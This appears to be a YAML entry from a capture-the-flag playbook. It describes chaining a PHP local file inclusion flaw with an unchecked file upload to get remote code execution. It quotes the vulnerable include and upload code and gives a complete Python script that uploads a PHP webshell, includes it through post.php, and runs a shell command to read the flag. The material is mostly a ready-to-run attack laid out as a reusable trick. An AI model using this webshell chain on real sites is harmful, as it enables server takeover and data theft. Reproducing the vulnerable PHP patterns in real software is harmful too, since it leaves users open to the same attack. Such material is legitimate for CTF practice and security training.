name: lfi_arbitrary_file_upload_chain
category: web
tags: [lfi, file_upload, php, rce]
indicators:
  - "LFI vulnerability but filters .. (path traversal)"
  - "Forces .php suffix"
  - "Arbitrary file upload without type check"
  - "Upload directory within LFI accessible range"

tricks:
  - name: "Step 1: Identify LFI vulnerability"
    when: "Analyze post.php"
    how: "Filters .. but can include subdirectory files, auto-adds .php"
    payload: |
      if (preg_match('/\.\.\//', $file)) exit();  # Filter ..
      $file_to_include = $base_path . $file . '.php';  # Force .php
      include($file_to_include);

  - name: "Step 2: Identify arbitrary file upload"
    when: "Analyze upload-article.php"
    how: "No file type check, uploads to posts/uploads/"
    payload: |
      $target_file = $target_dir . basename($_FILES["articleFile"]["name"]);
      move_uploaded_file($_FILES["articleFile"]["tmp_name"], $target_file);

  - name: "Step 3: Chain LFI + Upload for RCE"
    when: "Execute attack"
    how: "Upload PHP webshell, include via LFI"
    payload: |
      # Upload webshell to posts/uploads/shell.php
      # LFI include: post.php?id=uploads/shell (auto-adds .php)
      # Execute command to read flag

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Upload shell -> LFI include -> RCE"
    payload: |
      import requests, re
      
      TARGET = "http://TARGET"
      s = requests.Session()
      
      # Upload webshell
      shell = b"<?php system($_GET['cmd']); ?>"
      files = {"articleFile": ("shell.php", shell, "application/x-php")}
      data = {"name": "test", "email": "test@test.com"}
      s.post(f"{TARGET}/posts/upload-article.php", files=files, data=data)
      
      # LFI include and execute command
      resp = s.get(f"{TARGET}/post.php", params={
          "id": "uploads/shell",
          "cmd": "cat /FLAG.txt"
      })
      flag = re.search(r"FLAG\{[^}]+\}", resp.text)
      print(flag.group())
